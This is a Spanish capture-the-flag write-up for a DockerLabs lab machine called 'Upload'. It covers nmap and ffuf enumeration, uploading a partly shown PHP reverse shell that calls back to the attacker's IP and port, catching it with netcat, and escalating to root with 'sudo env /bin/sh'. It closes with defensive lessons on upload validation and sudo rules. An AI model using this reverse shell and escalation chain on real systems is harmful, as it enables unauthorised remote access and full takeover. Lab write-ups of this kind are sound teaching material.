---
tags:
  - CTF
  - writeup
  - dockerlabs
  - linux
  - web
  - file-upload
  - rce
  - privesc
dificultad: "⭐ Fácil"
sistema: "Ubuntu Linux"
ip: "172.17.0.2"
técnicas:
  - Enumeración web (ffuf)
  - Subida de archivo malicioso (PHP reverse shell)
  - RCE via PHP upload
  - Escalada de privilegios con sudo env
fecha: 2026-06-20
estado: "✅ Completada"
---

# 📤 Máquina: Upload

> [!info] Información general
> - **Plataforma:** DockerLabs
> - **Dificultad:** Muy fácil
> - **SO:** Ubuntu Linux
> - **IP objetivo:** `172.17.0.2`
> - **Técnicas:** Enumeración web · File upload sin validación · RCE via PHP · sudo env

---

## 🗺️ Flujo del ataque

```
Ping → Nmap (HTTP 80) → Upload page → ffuf (/uploads)
→ PHP reverse shell upload → RCE (www-data) → sudo env → root
```

---

## 1️⃣ Reconocimiento

### Verificación de conectividad

```bash
ping -c 4 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.042 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.049 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.044 ms
64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.043 ms
4 packets transmitted, 4 received, 0% packet loss
```

> [!tip] TTL = 64 → Sistema Linux confirmado

---

### Escaneo de puertos con Nmap

```bash
nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -oN scan -vvv 172.17.0.2
```

| Puerto | Estado | Servicio | Versión                      |
|--------|--------|----------|------------------------------|
| 80/tcp | open   | HTTP     | Apache httpd 2.4.52 (Ubuntu) |

> [!note] Solo el puerto 80 está abierto. La página se titula **"Upload here your file"** — vector directo de ataque.

---

## 2️⃣ Enumeración web

La página principal es un formulario simple que permite subir archivos sin validación aparente. Realizamos fuzzing recursivo para descubrir dónde se almacenan los uploads:

```bash
ffuf -w ~/Desktop/Lists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -u http://172.17.0.2/FUZZ \
  -r -recursion -t 200 -e .php,.html
```

**Resultado:**

```
uploads   [Status: 200, Size: 1132]
```

> [!success] Directorio `/uploads` descubierto — aquí se almacenan los archivos subidos y **son accesibles públicamente**.

```bash
curl -L http://172.17.0.2/uploads
```

El directorio lista los archivos subidos con un índice HTTP generado por Apache. Los archivos subidos **son ejecutables** en el contexto del servidor web.

---

## 3️⃣ Explotación — PHP reverse shell upload

Usamos [revshells.com](https://www.revshells.com/) para generar una PHP reverse shell con los parámetros:

- **OS:** Linux
- **Type:** Reverse
- **Payload:** PHP PentestMonkey

El payload generado es un script PHP que:
1. Abre una conexión TCP inversa a nuestra IP y puerto
2. Crea un proceso con bash
3. Canaliza stdin/stdout/stderr hacia la conexión de red

Creamos el archivo localmente:

```bash
cat > hi.php <<'EOF'
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
set_time_limit (0);
$VERSION = "1.0";
$ip = '172.17.0.1';
$port = 4343;
$chunk_size = 1400;
$shell = 'uname -a; w; id; /bin/bash -i';
$daemon = 0;
$debug = 0;

// ... (resto del script de reverse shell)
?>
EOF
```

Subimos el archivo a través del formulario en la página principal. Apache lo recibe en `/uploads/hi.php`.

### Establecimiento de la conexión

En una terminal abierta, nos ponemos a escuchar en el puerto configurado:

```bash
nc -lvnp 4343
```

```
Listening on 0.0.0.0 4343
```

En otra terminal, accedemos al archivo PHP subido para disparar la ejecución:

```bash
curl http://172.17.0.2/uploads/hi.php
```

El script PHP se ejecuta en el contexto de `www-data` (usuario del servidor web), se conecta de vuelta a nuestra máquina, y recibimos la shell:

```bash
Connection received on 172.17.0.2 48208
Linux a07e665cd18f 7.0.12-zen1-1-zen ...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@a07e665cd18f:/$
```

> [!success] RCE obtenido como usuario **`www-data`**.

---

## 4️⃣ Escalada de privilegios

Listamos los permisos sudo del usuario actual:

```bash
sudo -l
```

```
User www-data may run the following commands on a07e665cd18f:
    (root) NOPASSWD: /usr/bin/env
```

> [!note] `www-data` puede ejecutar `/usr/bin/env` como root sin contraseña. El binario `env` normalmente solo establece variables de entorno, pero con SUID podemos usarlo para lanzar una shell que herede el UID de root.

Referencia: [GTFOBins — env](https://gtfobins.org/gtfobins/env/)

```bash
sudo env /bin/sh
```

```
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

> [!success] Acceso **root** obtenido.

Mejoramos la terminal para interactividad completa:

```bash
script /dev/null -c bash
```

```
root@a07e665cd18f:/# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## ✅ Resumen

| Campo        | Valor                                  |
|--------------|----------------------------------------|
| Vector inicial | Formulario de upload sin validación  |
| Payload      | PHP reverse shell (revshells.com)     |
| Directorio upload | `/uploads` (accesible públicamente) |
| Usuario web  | www-data                              |
| Escalada     | sudo env /bin/sh                      |
| Acceso final | root directo, sin contraseña          |

---

## 🔍 Lecciones aprendidas

> [!danger] Malas prácticas identificadas
> - **Upload sin validación de tipo** — aceptar cualquier archivo subido es crítico. Debería validarse extensión, MIME type y contenido.
> - **Directorio de uploads accesible públicamente** — los archivos subidos nunca deberían ser directamente ejecutables. Almacenar fuera del web root o usar `php.ini` para deshabilitar ejecución en ese directorio.
> - **Permisos sudo para `env`** — `/usr/bin/env` con NOPASSWD es equivalente a acceso root directo cuando se ejecuta desde un usuario con acceso web.
> - **www-data ejecutando con permisos elevados** — el proceso Apache debería correr con el usuario más restrictivo posible, nunca con capacidad de escalar a root fácilmente.

---

## 📚 Referencias

- [revshells.com](https://www.revshells.com/)
- [GTFOBins — env](https://gtfobins.org/gtfobins/env/)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [ffuf](https://github.com/ffuf/ffuf)
